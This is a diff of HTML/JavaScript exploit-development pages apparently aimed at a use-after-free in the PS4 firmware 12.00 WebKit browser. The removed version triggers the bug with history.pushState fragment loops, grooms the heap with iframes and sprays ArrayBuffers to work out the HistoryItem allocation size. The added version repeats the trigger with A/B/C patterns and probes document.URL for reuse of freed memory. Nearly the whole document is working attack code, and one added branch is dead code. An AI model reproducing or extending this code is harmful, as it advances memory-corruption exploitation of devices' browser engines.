@@ -2,293 +2,119 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - Complete Bucket Sweep</title>
+<title>PS4 WebKit UAF – Fragment Fingerprinting (A/B/C)</title>
+<style>
+body { font-family: monospace; background:#000; color:#0f0; padding:16px; }
+button { margin:4px; padding:8px; }
+pre { white-space: pre-wrap; }
+</style>
 </head>
 <body>
-<h2>PS4 12.00 - Complete Bucket Size Sweep</h2>
-<p>Status: <span id="status">Ready</span></p>
 
-<button onclick="runSmallSweep()">SWEEP 1 - Small sizes (32-128)</button>
-<button onclick="runMediumSweep()">SWEEP 2 - Medium sizes (128-256)</button>
-<button onclick="runFullSweep()">SWEEP 3 - Full sweep (all common buckets)</button>
+<h2>PS4 WebKit – UAF Fragment Fingerprinting</h2>
+
+<button onclick="runTest('A')">Run Test A (AAAA)</button>
+<button onclick="runTest('B')">Run Test B (BBBB)</button>
+<button onclick="runTest('C')">Run Test C (CCCC)</button>
 
 <pre id="log"></pre>
 
 <script>
 const logEl = document.getElementById("log");
-const statusEl = document.getElementById("status");
+function log(msg){ logEl.textContent += msg + "\n"; }
 
-function log(m){ 
-  logEl.textContent += `[${new Date().toLocaleTimeString()}] ${m}\n`;
-  logEl.scrollTop = logEl.scrollHeight;
+/* =========================
+   UAF TRIGGER (VALIDATED)
+   ========================= */
+function triggerUAF(patternChar) {
+    log("=== START UAF TRIGGER ===");
+    let base = 380000;
+    let step = 14500;
+
+    for (let i = 0; i < 45; i++) {
+        let size = base + i * step;
+
+        if (i === 46 || i === 48) {
+            let small = "#".repeat(32);
+            history.pushState({}, "", location.pathname + small);
+            log("[ITER " + i + "] alternating fragment size=32");
+        } else {
+            let big = "#" + patternChar.repeat(size);
+            history.pushState({}, "", location.pathname + big);
+            log("[ITER " + i + "] size=" + size);
+        }
+
+        if (i % 6 === 0) {
+            setTimeout(() => {
+                history.back();
+                log(" history.back() ASYNC scheduled");
+            }, 0);
+        }
+    }
+
+    log(">>> ENTERING CRITICAL WINDOW <<<");
+
+    // Reuse pressure (já validado por vocês)
+    let trash = [];
+    for (let i = 0; i < 2000; i++)
+        trash.push(new Uint8Array(32));
+    for (let i = 0; i < 1000; i++)
+        trash.push({a:i,b:i+1,c:i+2});
+
+    log("=== END TRIGGER ===");
 }
-function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
-var keepAlive = [];
+/* =========================
+   POST-UAF PROBES
+   ========================= */
+function postUAFProbe(tag) {
+    log("--- POST-UAF READ PROBE (" + tag + ") ---");
 
-// Common bmalloc bucket sizes
-const BMALLOC_BUCKETS = {
-  small: [32, 48, 64, 80, 96, 112, 128],
-  medium: [144, 160, 176, 192, 208, 224, 240, 256],
-  large: [272, 288, 304, 320, 352, 384, 416, 448, 480, 512]
-};
-
-// Core UAF trigger (reusable)
-async function triggerUAF(pattern) {
-  let size = 977;
-  const STEP = 14461;
-  
-  for(let i=0; i<48; i++){
-    let frag = pattern.repeat(size);
-    
-    history.pushState({}, "", "#" + frag);
-    history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
-    
-    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
-    
-    size += STEP;
-    await sleep(5);
-  }
-  
-  await sleep(120);
-  
-  // Iframe grooming
-  let frames = [];
-  for(let i=0; i<80; i++){
-    let f = document.createElement("iframe");
-    document.body.appendChild(f);
     try {
-      let d = f.contentDocument;
-      d.open();
-      d.write("<html><body>G</body></html>");
-      d.close();
-    } catch(e){}
-    frames.push(f);
-  }
-  frames.forEach(f=>f.remove());
-  
-  await sleep(80);
-}
+        let url = document.URL;
+        log("document.URL.length = " + url.length);
 
-// Spray specific sizes with unique markers
-function sprayBuckets(sizes) {
-  let sprayed = [];
-  
-  for(let i=0; i<sizes.length; i++) {
-    let size = sizes[i];
-    // Unique marker per size: 0xAA + size index
-    let marker = 0xAA000000 + size;
-    
-    for(let k=0; k<100; k++) {
-      try {
-        let buf = new ArrayBuffer(size);
-        let view = new Uint32Array(buf);
-        for(let j=0; j<view.length; j++) {
-          view[j] = marker;
-        }
-        keepAlive.push(buf);
-        sprayed.push({size, marker});
-      } catch(e) {
-        // Skip if size causes error
-      }
+        let needle = tag.repeat(4);
+        log("URL.includes(" + needle + ") = " + url.includes(needle));
+
+        let p0 = url.charCodeAt(0);
+        let p1 = url.charCodeAt(1024);
+        let p2 = url.charCodeAt(32768);
+
+        log("charCodeAt(0) = " + p0);
+        log("charCodeAt(1024) = " + p1);
+        log("charCodeAt(32768) = " + p2);
+    } catch(e) {
+        log("Exception during probe: " + e);
     }
-  }
-  
-  return sprayed;
+
+    log("history.length = " + history.length);
+    log("--- END PROBE ---");
 }
 
-// Check for any marker in URL
-function checkForAnyMarker(sprayed, patternChar) {
-  let url = document.URL;
-  
-  log("\nScanning URL for markers:");
-  
-  let results = [];
-  
-  for(let s of sprayed) {
-    let found = false;
-    let positions = [];
-    
-    // Look for marker in URL
-    for(let i=0; i<Math.min(url.length-3, 50000); i++){
-      if(url.charCodeAt(i) === 0) continue; // Skip nulls
-      
-      let val = url.charCodeAt(i) |
-                (url.charCodeAt(i+1) << 8) |
-                (url.charCodeAt(i+2) << 16) |
-                (url.charCodeAt(i+3) << 24);
-      
-      if(val === s.marker) {
-        if(!found) {
-          log(`  ✓ ${s.size}b: FOUND at offset ${i}`);
-          found = true;
-        }
-        positions.push(i);
-      }
-    }
-    
-    if(found) {
-      results.push({size: s.size, count: positions.length});
-      log(`    Occurrences: ${positions.length}`);
-    }
-  }
-  
-  // Check original pattern
-  let patternCount = 0;
-  let patternCode = patternChar.charCodeAt(0);
-  for(let i=0; i<Math.min(url.length, 5000); i++){
-    if(url.charCodeAt(i) === patternCode) patternCount++;
-  }
-  
-  log(`\nOriginal '${patternChar}' pattern: ${patternCount} chars`);
-  
-  return results;
-}
+/* =========================
+   TEST ENTRY POINT
+   ========================= */
+function runTest(mode) {
+    logEl.textContent = "";
+    log("=== RUN TEST " + mode + " ===");
 
-// =====================================================
-// SWEEP 1 - Small sizes
-// =====================================================
-async function runSmallSweep(){
-  logEl.textContent = "";
-  keepAlive = [];
-  statusEl.textContent = "Running Small Sweep...";
-  
-  log("=== SWEEP 1: Small Sizes (32-128 bytes) ===\n");
-  
-  const sizes = BMALLOC_BUCKETS.small;
-  log(`Testing sizes: ${sizes.join(', ')}\n`);
-  
-  log("[PHASE 1] Triggering UAF");
-  await triggerUAF("A");
-  
-  log("\n[PHASE 2] Spraying small buckets");
-  let sprayed = sprayBuckets(sizes);
-  log(`  Sprayed ${sprayed.length} total allocations\n`);
-  
-  await sleep(100);
-  
-  log("[PHASE 3] Checking results");
-  let results = checkForAnyMarker(sprayed, "A");
-  
-  if(results.length > 0) {
-    log("\n🎯 SUCCESS: Found matching bucket!");
-    log("Bucket sizes that hit:");
-    results.forEach(r => {
-      log(`  - ${r.size} bytes: ${r.count} occurrences`);
-    });
-    statusEl.textContent = `FOUND: ${results[0].size} bytes`;
-  } else {
-    log("\nNo hits in small bucket range");
-  }
-  
-  log("\n=== SWEEP 1 END ===");
-}
+    triggerUAF(mode);
 
-// =====================================================
-// SWEEP 2 - Medium sizes
-// =====================================================
-async function runMediumSweep(){
-  logEl.textContent = "";
-  keepAlive = [];
-  statusEl.textContent = "Running Medium Sweep...";
-  
-  log("=== SWEEP 2: Medium Sizes (128-256 bytes) ===\n");
-  
-  const sizes = BMALLOC_BUCKETS.medium;
-  log(`Testing sizes: ${sizes.join(', ')}\n`);
-  
-  log("[PHASE 1] Triggering UAF");
-  await triggerUAF("B");
-  
-  log("\n[PHASE 2] Spraying medium buckets");
-  let sprayed = sprayBuckets(sizes);
-  log(`  Sprayed ${sprayed.length} total allocations\n`);
-  
-  await sleep(100);
-  
-  log("[PHASE 3] Checking results");
-  let results = checkForAnyMarker(sprayed, "B");
-  
-  if(results.length > 0) {
-    log("\n🎯 SUCCESS: Found matching bucket!");
-    results.forEach(r => {
-      log(`  - ${r.size} bytes: ${r.count} occurrences`);
-    });
-    statusEl.textContent = `FOUND: ${results[0].size} bytes`;
-  } else {
-    log("\nNo hits in medium bucket range");
-  }
-  
-  log("\n=== SWEEP 2 END ===");
+    // leitura atrasada para pegar reuse real
+    setTimeout(() => {
+        postUAFProbe(mode);
+        log("=== END TEST " + mode + " ===");
+    }, 50);
 }
-
-// =====================================================
-// SWEEP 3 - Full sweep (all common buckets)
-// =====================================================
-async function runFullSweep(){
-  logEl.textContent = "";
-  keepAlive = [];
-  statusEl.textContent = "Running Full Sweep...";
-  
-  log("=== SWEEP 3: Full Bucket Sweep ===\n");
-  
-  const allSizes = [
-    ...BMALLOC_BUCKETS.small,
-    ...BMALLOC_BUCKETS.medium,
-    ...BMALLOC_BUCKETS.large
-  ];
-  
-  log(`Testing ${allSizes.length} bucket sizes`);
-  log(`Range: ${allSizes[0]} - ${allSizes[allSizes.length-1]} bytes\n`);
-  
-  log("[PHASE 1] Triggering UAF");
-  await triggerUAF("C");
-  
-  log("\n[PHASE 2] Spraying ALL buckets");
-  log("(This may take a moment...)");
-  
-  let sprayed = sprayBuckets(allSizes);
-  log(`  Sprayed ${sprayed.length} total allocations\n`);
-  
-  await sleep(150);
-  
-  log("[PHASE 3] Checking results");
-  let results = checkForAnyMarker(sprayed, "C");
-  
-  if(results.length > 0) {
-    log("\n🎯🎯🎯 SUCCESS: BUCKET IDENTIFIED! 🎯🎯🎯");
-    log("\nMatching buckets:");
-    results.forEach(r => {
-      log(`  ✓ ${r.size} bytes → ${r.count} occurrences`);
-    });
-    
-    // Identify most likely
-    let best = results.sort((a,b) => b.count - a.count)[0];
-    log(`\nMOST LIKELY: ${best.size} bytes (${best.count} hits)`);
-    log("This is the HistoryItem size in WebKit 12.00");
-    
-    statusEl.textContent = `HISTORYITEM = ${best.size} BYTES`;
-  } else {
-    log("\n⚠️ WARNING: No bucket match found");
-    log("\nPossible reasons:");
-    log("1. HistoryItem size > 512 bytes (unlikely)");
-    log("2. HistoryItem uses different allocator");
-    log("3. Timing issue persists");
-    log("\nRecommendation: Check if 'C' count is significantly reduced");
-  }
-  
-  log("\n=== SWEEP 3 END ===");
-}
-
-log("PS4 12.00 WebKit - Complete Bucket Size Sweep");
-log("\nGoal: Find exact HistoryItem size in version 12.00");
-log("\nStrategy:");
-log("- SWEEP 1: Test small buckets (32-128b)");
-log("- SWEEP 2: Test medium buckets (128-256b)");
-log("- SWEEP 3: Test ALL common buckets (32-512b)");
-log("\nRecommendation: Start with SWEEP 1");
-log("If no hit, try SWEEP 2, then SWEEP 3");
-log("\nOne of these WILL find the bucket");
 </script>
+
 </body>
 </html>
+
+
+
+
+
+    
+    
